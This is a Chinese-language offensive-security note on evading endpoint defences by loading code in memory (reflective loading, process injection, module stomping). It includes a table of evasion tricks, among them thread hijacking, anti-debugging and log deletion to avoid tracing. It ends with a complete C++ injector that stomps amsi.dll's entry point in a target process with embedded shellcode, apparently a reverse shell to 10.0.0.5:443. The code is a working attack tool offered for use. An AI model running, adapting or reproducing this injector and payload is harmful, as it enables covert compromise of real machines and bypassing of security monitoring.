[TOC]

------

# 防御规避——内存加载技术

- **T1620 - 反射代码加载**（主要）
- **T1055 - 进程注入**（次要）
  - **T1055.001 - Dynamic-link Library Injection 动态链接库注入**
  - **T1055.002 - Portable Executable Injection 可移植执行体注入**
  - **T1055.012 - Module Stomping / Process Hollowing 进程空洞化**

------

## 轻量级自定义 PE 加载器

核心是 “跳过系统加载的冗余步骤，只保留‘代码执行必需的环节’，同时隐藏痕迹”。常见方案分 3 类：

### 一、内存中直接加载“迷你PE”（无磁盘文件）

如果 shellcode 无需调用外部 API（即 “无依赖 shellcode”），只包含`.text`段的 shellcode，去掉冗余区段

1. **获取内存中的 PE 数据**：通过网络下载、base64 解码、进程间内存传输等方式，把 “迷你 PE” 的二进制数据放到目标进程的内存中（比如注入到`explorer.exe`这类可信进程）；
2. **自定义 PE 解析与加载**：
   - 手动解析 PE 头，找到`.text`段的位置和大小；
   - 用`VirtualAllocEx`（或绕 Hook 的内存分配方式）在目标进程中分配 “可读可执行” 内存；
   - 把`miniPE`的`.text`段（即 shellcode）复制到分配的内存中；
   - 手动修复重定位表（如果加载地址变化）和 IAT 表（如果 shellcode 调用了系统 API）；
3. **启动执行**：用线程劫持代替`CreateRemoteThread`让目标进程的线程跳转到 shellcode 的内存地址，完成执行。

**优势**：全程无磁盘文件，静态扫描无法检测；加载过程不依赖系统 PE 加载器，绕开大部分监控。

### 二、反射式PE加载（绕开 `LoadLibrary`）

（反射式DLL注入）

### 三、无文件PE加载

再目标进程内存中“动态生成PE结构”：

1. **在目标内存中构造 PE 头和区段**：通过代码动态生成 PE 头、`.text`段（直接写入 shellcode 字节），不依赖外部传输的 PE 数据；
2. **极简加载执行**：只分配内存、写入 shellcode、设置执行权限，跳过重定位和 IAT 修复（前提是 shellcode 不调用外部 API，即 “无依赖 shellcode”）；
3. **触发执行**：用 “线程劫持”（劫持目标进程已有的线程，让它执行 shellcode）替代`CreateRemoteThread`，完全绕开线程创建的监控。

**优势**：无文件、无外部数据传输、无新线程创建，几乎无痕迹，是目前对抗性极强的方式。

------

## 关于反射式 DLL 注入技术

### 一、反射式 DLL 注入为什么 “不依赖 LoadLibrary”？

首先要明确一个前提：**正常情况下，Windows 程序加载 DLL 必须用系统 API（如 LoadLibraryA/L）**，但这个 API 会留下 “痕迹”（比如触发安全软件的监控、在进程模块列表中显示 DLL 路径），所以反射式 DLL 注入本质是 “模拟系统加载 DLL 的过程，自己动手解析 DLL 文件，避免调用系统 API”。

#### 1. 正常 DLL 是怎么加载的？（依赖 LoadLibrary）

当你用`LoadLibraryA("恶意.dll")`加载一个 DLL 时，Windows 会帮你做 3 件核心事：

- **读取磁盘文件**：从指定路径读取 DLL 文件到内存，验证 PE 格式（确保是合法可执行文件）；
- **内存分配与重定位**：在进程地址空间分配一块内存，将 DLL 的 “代码段、数据段” 复制过去，修正 DLL 中引用的 “外部函数地址”（比如 DLL 里用了`MessageBoxA`，需要找到系统中`user32.dll`里`MessageBoxA`的真实地址）；
- **执行入口函数**：调用 DLL 的`DllMain`函数（这是 DLL 的 “启动入口”，恶意 DLL 会在这里写 shellcode 的执行逻辑）。

但问题是：`LoadLibrary`是 Windows 的**公开敏感 API**，几乎所有安全软件都会 “Hook” 它 —— 只要有程序调用`LoadLibrary`加载可疑 DLL，就会触发告警或拦截。

#### 2. 反射式 DLL 注入：自己模拟系统的 “加载流程”，绕开 LoadLibrary

反射式 DLL 注入的核心思路：**把 “系统帮你做的 3 件事”，全部自己用代码实现**，完全不调用`LoadLibrary`，让安全软件 “看不到 DLL 加载的痕迹”。具体步骤如下：

- **获取 DLL 的内存数据**：不读磁盘文件（避免留下文件操作痕迹），而是直接把 DLL 的二进制数据（比如 base64 解码后、或从网络下载到内存）放到目标进程的内存中；

- **自己解析 PE 格式**：
  - 找到 DLL 的 “PE 头”（PE 格式是 Windows 可执行文件的标准结构，包含代码段、数据段的位置和大小）；
  
  - 自己在目标进程中分配内存（用`VirtualAllocEx`，但会配合其他技术绕监控），把 DLL 的 “代码段” 复制到内存并设为 “可执行”，“数据段” 复制到内存并设为 “可读写”；
  - 自己修正 “外部函数地址”：遍历 DLL 中需要调用的系统函数（比如`MessageBoxA`），通过`GetProcAddress`（或更隐蔽的方式）找到这些函数的真实地址，手动填到 DLL 的内存中（这个过程叫 “IAT 修复”，**IAT 是 DLL 中存储外部函数地址的表**）；
  
- **自己调用 DLL 入口**：不依赖系统调用`DllMain`，而是直接找到 DLL 中自定义的 “反射入口函数”（比如函数名不是`DllMain`，而是自定义的`ReflectiveLoader`），用`CreateRemoteThread`（或线程劫持）让目标进程执行这个入口函数 —— 入口函数执行后，恶意代码（如 shellcode）就跑起来了。

| 关键步骤          | 常规做法（易被发现）                | 攻防场景中的隐蔽做法（绕监控）                               | 核心目的                         |
| ----------------- | ----------------------------------- | ------------------------------------------------------------ | -------------------------------- |
| 1. 获取 shellcode | 从磁盘 exe 中读取                   | 内存中生成（如解密 base64 字符串、网络下载到内存）           | 避免磁盘留下恶意文件，防静态扫描 |
| 2. 分配可执行内存 | 调用 VirtualAlloc（设为可执行权限） | 1. 找已有的可执行内存（如利用进程中已加载的 DLL 的空闲内存）；2. 先分配 “可读写” 内存，写入 shellcode 后再改成 “可执行”（分两步，绕 Hook） | 避免触发 VirtualAlloc 的钩子     |
| 3. 执行 shellcode | 调用 CreateThread 启动新线程        | 1. 线程劫持（劫持目标进程中已有的线程，让它执行 shellcode）；2. 利用系统回调函数（如`SetTimer`，用定时器触发 shellcode 执行） | 避免触发 CreateThread 的钩子     |
| 4. 隐藏执行痕迹   | 直接执行，不处理                    | 1. 代码混淆（用无意义指令填充 shellcode，打乱特征）；2. 反调试（检测是否有调试器，有则退出）；3. 清理日志（删除操作日志，避免被溯源） | 防止被安全软件分析、溯源         |

下面是将`amsi.dll`注入进程并镂空加载我们shellcode的简单实现：

```c++
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <psapi.h>

int main(int argc, char *argv[])
{
    HANDLE processHandle;
    PVOID remoteBuffer;
    wchar_t moduleToInject[] = L"C:\\windows\\system32\\amsi.dll";
    HMODULE modules[256] = {};
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;
    DWORD moduleNameSize = 0;
    SIZE_T modulesCount = 0;
    CHAR remoteModuleName[128] = {};
    HMODULE remoteModule = NULL;

    unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x00\x05\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

    // inject a benign DLL into remote process
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    //processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 8444);

    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof moduleToInject, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL);
    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
    WaitForSingleObject(dllThread, 1000);

    // find base address of the injected benign DLL in remote process
    EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded);
    modulesCount = modulesSizeNeeded / sizeof(HMODULE);
    for (size_t i = 0; i < modulesCount; i++)
    {
        remoteModule = modules[i];
        GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));
        if (std::string(remoteModuleName).compare("amsi.dll") == 0) 
        {
            std::cout << remoteModuleName << " at " << modules[i];
            break;
        }
    }

    // get DLL's AddressOfEntryPoint
    DWORD headerBufferSize = 0x1000;
    LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
    ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
    LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
    std::cout << ", entryPoint at " << dllEntryPoint;

    // write shellcode to DLL's AddressofEntryPoint
    WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);

    // execute shellcode from inside the benign DLL
    CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);

    return 0;
}
```

------









